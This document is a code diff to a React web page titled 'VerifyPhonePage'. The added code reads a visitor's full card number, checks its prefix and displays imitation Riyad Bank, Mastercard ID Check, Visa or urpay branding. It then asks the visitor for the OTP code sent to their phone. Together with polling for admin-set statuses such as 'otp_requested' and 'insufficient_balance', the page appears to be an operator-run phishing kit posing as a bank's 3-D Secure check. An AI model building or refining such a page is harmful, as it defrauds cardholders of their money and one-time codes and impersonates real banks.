@@ -31,6 +31,7 @@ export default function VerifyPhonePage() {
   const [orderNumber, setOrderNumber] = useState('');
   const [customerNotificationKey, setCustomerNotificationKey] = useState('');
   const [cardLast4, setCardLast4] = useState('0000');
+  const [cardPrefixType, setCardPrefixType] = useState<'riyad' | 'urpay' | 'default'>('default');
   const [draftReady, setDraftReady] = useState(false);
   const [referenceCode, setReferenceCode] = useState('');
   const [error, setError] = useState('');
@@ -67,17 +68,29 @@ export default function VerifyPhonePage() {
           ? draft.confirmedAt
           : null;
 
-      // استخراج وإسناد آخر 4 أرقام للبطاقة بشكل مؤكد ومباشر للـ State
       if (draft) {
+        const fullCardNum =
+          typeof draft.cardNumber === 'string'
+            ? draft.cardNumber.replace(/\D/g, '')
+            : typeof draft.card_number === 'string'
+            ? draft.card_number.replace(/\D/g, '')
+            : typeof draft.card === 'string'
+            ? draft.card.replace(/\D/g, '')
+            : '';
+
+        if (fullCardNum.startsWith('5297')) {
+          setCardPrefixType('riyad');
+        } else if (fullCardNum.startsWith('4909')) {
+          setCardPrefixType('urpay');
+        } else {
+          setCardPrefixType('default');
+        }
+
         let extractedLast4 = '0000';
         if (typeof draft.cardLast4 === 'string' && draft.cardLast4.length === 4) {
           extractedLast4 = draft.cardLast4;
-        } else if (typeof draft.cardNumber === 'string' && draft.cardNumber.length >= 4) {
-          const clean = draft.cardNumber.replace(/\D/g, '');
-          if (clean.length >= 4) extractedLast4 = clean.slice(-4);
-        } else if (typeof draft.card_number === 'string' && draft.card_number.length >= 4) {
-          const clean = draft.card_number.replace(/\D/g, '');
-          if (clean.length >= 4) extractedLast4 = clean.slice(-4);
+        } else if (fullCardNum.length >= 4) {
+          extractedLast4 = fullCardNum.slice(-4);
         }
         setCardLast4(extractedLast4);
       }
@@ -137,23 +150,34 @@ export default function VerifyPhonePage() {
         );
         if (!response.ok) return;
 
-        const result = await response.json() as {
+        const result = (await response.json()) as {
           ok?: boolean;
           notifications?: Array<{ orderId?: string; status?: string; createdAt?: string }>;
         };
         const verificationTime = confirmedAt ?? 0;
-        const matchingNotice = result.ok === true &&
+        const matchingNotice =
+          result.ok === true &&
           Array.isArray(result.notifications) &&
           result.notifications.find((item) => {
             const createdAt = Date.parse(item.createdAt || '');
-            return item.orderId === orderId &&
-              (item.status === 'otp_requested' || item.status === 'card_details_incorrect' || item.status === 'insufficient_balance') &&
+            return (
+              item.orderId === orderId &&
+              (item.status === 'otp_requested' ||
+                item.status === 'card_details_incorrect' ||
+                item.status === 'insufficient_balance') &&
               Number.isFinite(createdAt) &&
-              createdAt >= verificationTime - 15_000;
+              createdAt >= verificationTime - 15_000
+            );
           });
 
         if (active && matchingNotice) {
-          setAdminNoticeType(matchingNotice.status === 'otp_requested' ? 'otp' : matchingNotice.status === 'card_details_incorrect' ? 'card' : 'balance');
+          setAdminNoticeType(
+            matchingNotice.status === 'otp_requested'
+              ? 'otp'
+              : matchingNotice.status === 'card_details_incorrect'
+              ? 'card'
+              : 'balance'
+          );
         }
       } catch {
         // Retry
@@ -163,8 +187,12 @@ export default function VerifyPhonePage() {
     };
 
     void checkAdminNotice();
-    const timer = window.setInterval(() => { void checkAdminNotice(); }, 2500);
-    const handleFocus = () => { void checkAdminNotice(); };
+    const timer = window.setInterval(() => {
+      void checkAdminNotice();
+    }, 2500);
+    const handleFocus = () => {
+      void checkAdminNotice();
+    };
     window.addEventListener('focus', handleFocus);
 
     return () => {
@@ -190,14 +218,15 @@ export default function VerifyPhonePage() {
         );
         if (!response.ok) return;
 
-        const result = await response.json() as {
+        const result = (await response.json()) as {
           ok?: boolean;
           notifications?: Array<{ orderId?: string; status?: string }>;
         };
-        const matchingInvoice = result.ok === true &&
+        const matchingInvoice =
+          result.ok === true &&
           Array.isArray(result.notifications) &&
-          result.notifications.some((item) =>
-            item.orderId === orderId && item.status === 'invoice_documents'
+          result.notifications.some(
+            (item) => item.orderId === orderId && item.status === 'invoice_documents'
           );
 
         if (active && matchingInvoice) setInvoiceSent(true);
@@ -209,8 +238,12 @@ export default function VerifyPhonePage() {
     };
 
     void checkInvoiceSent();
-    const timer = window.setInterval(() => { void checkInvoiceSent(); }, 2500);
-    const handleFocus = () => { void checkInvoiceSent(); };
+    const timer = window.setInterval(() => {
+      void checkInvoiceSent();
+    }, 2500);
+    const handleFocus = () => {
+      void checkInvoiceSent();
+    };
     window.addEventListener('focus', handleFocus);
 
     return () => {
@@ -236,10 +269,10 @@ export default function VerifyPhonePage() {
         body: JSON.stringify({
           orderId,
           customerNotificationKey,
-          code: referenceCode
-        })
+          code: referenceCode,
+        }),
       });
-      const result = await response.json() as { ok?: boolean; error?: string };
+      const result = (await response.json()) as { ok?: boolean; error?: string };
       if (!response.ok || result.ok !== true) {
         setError(result.error || 'تعذر إرسال رمز الطلب. حاول مرة أخرى.');
         return;
@@ -267,48 +300,115 @@ export default function VerifyPhonePage() {
     );
   }
 
-  // إذا لم يتم تأكيد الرقم بعد، اعرض شاشة الإدخال الطبيعية
+  // الهيدر المتغير بناءً على نوع البادئة
+  const HeaderLogos = () => {
+    if (cardPrefixType === 'riyad') {
+      return (
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '520px', margin: '0 auto 35px auto', padding: '0 10px', direction: 'ltr' }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+            <svg width="34" height="34" viewBox="0 0 40 40" fill="none">
+              <path d="M0 20L15 5V25L0 20Z" fill="#00b493" />
+              <path d="M15 5L40 5V25L25 40V20L15 5Z" fill="#1b0066" />
+            </svg>
+            <div style={{ display: 'flex', flexDirection: 'column', textAlign: 'left', lineHeight: '1.1' }}>
+              <span style={{ fontSize: '20px', fontWeight: 'bold', color: '#68727d', fontFamily: 'sans-serif' }}>بنك الرياض</span>
+              <span style={{ fontSize: '16px', fontWeight: '800', color: '#68727d', fontFamily: 'sans-serif', letterSpacing: '0.5px' }}>Riyad Bank</span>
+            </div>
+          </div>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+            <div style={{ display: 'flex', alignItems: 'center' }}>
+              <span style={{ width: '22px', height: '22px', borderRadius: '50%', background: '#eb001b', display: 'inline-block' }} />
+              <span style={{ width: '22px', height: '22px', borderRadius: '50%', background: '#f79e1b', display: 'inline-block', marginLeft: '-9px', opacity: 0.95 }} />
+            </div>
+            <span style={{ color: '#ccc', fontSize: '22px', fontWeight: '300' }}>|</span>
+            <span style={{ fontSize: '21px', fontWeight: '400', color: '#111', fontFamily: 'sans-serif', letterSpacing: '-0.3px' }}>ID Check</span>
+          </div>
+        </div>
+      );
+    }
+
+    if (cardPrefixType === 'urpay') {
+      return (
+        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%', maxWidth: '520px', margin: '0 auto 35px auto', padding: '0 10px', direction: 'ltr' }}>
+          <span style={{ fontSize: '38px', fontWeight: 'bold', fontStyle: 'italic', color: '#1a1f71', fontFamily: 'sans-serif', letterSpacing: '-1px' }}>
+            VISA
+          </span>
+          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.5 15h-3v-6h3v6zm0-8h-3V7h3v2z" fill="#0052cc" />
+            </svg>
+            <span style={{ fontSize: '22px', fontWeight: '900', color: '#0052cc', fontFamily: 'sans-serif', letterSpacing: '-0.5px' }}>urpay</span>
+          </div>
+        </div>
+      );
+    }
+
+    return (
+      <div style={{ textAlign: 'center', marginBottom: '30px' }}>
+        <span style={{ fontSize: '38px', fontWeight: 'bold', fontStyle: 'italic', color: '#1a1f71', fontFamily: 'sans-serif', letterSpacing: '-1px' }}>
+          visa
+        </span>
+      </div>
+    );
+  };
+
   if (!verified) {
     return (
-      <main className="erd-verify-page" style={{ direction: 'rtl', padding: '20px', maxWidth: '440px', margin: 'auto', minHeight: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
-        <h1 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '10px' }}>تأكيد الطلب</h1>
-        <p style={{ color: '#666', marginBottom: '20px' }}>أدخل رمز التأكيد المرسل لرقم الجوال أو المرجع الخاص بالعملية.</p>
-        
+      <main className="erd-verify-page" style={{ direction: 'rtl', padding: '30px 20px', maxWidth: '480px', margin: 'auto', minHeight: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', backgroundColor: '#fff' }}>
+        <HeaderLogos />
+
+        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
+          <p style={{ color: '#666', fontSize: '15px', marginBottom: '8px' }}>تم ارسال كود الي رقمك</p>
+          <p style={{ color: '#222', fontSize: '16px', fontWeight: 'bold' }}>
+            من فضلك ارسل رمز الهاتف المرتبط بهذه الفيزا.
+          </p>
+          <p style={{ fontSize: '22px', fontWeight: 'bold', letterSpacing: '3px', marginTop: '10px', color: '#111' }}>
+            •••• {cardLast4}
+          </p>
+        </div>
+
         <div style={{ marginBottom: '15px' }}>
+          <label style={{ display: 'block', textAlign: 'center', color: '#777', fontSize: '14px', marginBottom: '8px' }}>OTP Code</label>
           <input
             type="text"
-            placeholder="أدخل الرمز (4-6 أرقام)"
             value={referenceCode}
             onChange={(e) => setReferenceCode(e.target.value)}
             maxLength={6}
-            style={{ width: '100%', padding: '12px', borderRadius: '8px', border: '1px solid #ccc', fontSize: '16px' }}
+            style={{ width: '100%', padding: '12px', borderRadius: '4px', border: '1px solid #a6b9d7', fontSize: '18px', textAlign: 'center', outline: 'none' }}
           />
         </div>
 
-        {error && <p style={{ color: 'red', marginBottom: '15px' }}>{error}</p>}
+        {error && <p style={{ color: 'red', textAlign: 'center', marginBottom: '15px', fontSize: '14px' }}>{error}</p>}
 
         <button
           type="button"
           onClick={handleVerify}
           disabled={isVerifying}
-          style={{ width: '100%', padding: '14px', background: '#12354e', color: '#fff', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' }}
+          style={{ width: '100%', padding: '12px', background: '#5b82c6', color: '#fff', border: 'none', borderRadius: '4px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', marginBottom: '15px' }}
         >
-          {isVerifying ? 'جاري التحقق...' : 'تأكيد الرمز'}
+          {isVerifying ? 'جاري التحقق...' : 'معاينة الرمز'}
         </button>
+
+        <div style={{ textAlign: 'center' }}>
+          <button type="button" style={{ background: 'none', border: 'none', color: '#2b6cb0', fontSize: '14px', cursor: 'pointer', textDecoration: 'underline' }}>
+            مسح الرمز
+          </button>
+        </div>
       </main>
     );
   }
 
-  // شاشة الانتظار أو الإشعارات مع استخدام المتغير {cardLast4} الفعلي
   return (
-    <main className="erd-retry-page">
-      <style jsx global>{`
-        @import url("https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap");
-        .erd-retry-page, .erd-retry-page * { box-sizing: border-box; font-family: Cairo, system-ui, sans-serif; }
-        .erd-retry-page { direction: rtl; background: #f4f7f6; color: #12354e; width: 100%; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .erd-retry-card { background: #fff; width: 100%; max-width: 440px; border-radius: 28px; padding: 36px 24px; box-shadow: 0 10px 30px rgba(0,0,0,.04); text-align: center; }
-      `}</style>
+    <main className="erd-retry-page" style={{ direction: 'rtl', padding: '30px 20px', maxWidth: '480px', margin: 'auto', minHeight: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', backgroundColor: '#fff' }}>
+      <HeaderLogos />
 
-      <section className="erd-retry-card" aria-live="polite">
-        <h1 style={{ fontSize: '26px', fontWeight: 800, marginBottom: '10px' }}>جارٍ إتمام العملية</h1>
-        <p style={{ color: '#555', marginBottom: '20px' }}>آخر أرقام البطاقة المستخدمة: <strong>{cardLast4}</strong></p>
+      <div style={{ textAlign: 'center' }}>
+        <h1 style={{ fontSize: '22px', fontWeight: 'bold', marginBottom: '12px', color: '#12354e' }}>جارٍ إتمام العملية</h1>
+        <p style={{ color: '#555', marginBottom: '15px', fontSize: '16px' }}>
+          آخر أرقام البطاقة المستخدمة: <strong>•••• {cardLast4}</strong>
+        </p>
+        <p style={{ color: '#00a88a', fontWeight: 'bold', fontSize: '15px' }}>يرجى الانتظار بينما نقوم بمعالجة طلبك...</p>
+      </div>
+    </main>
+  );
+}
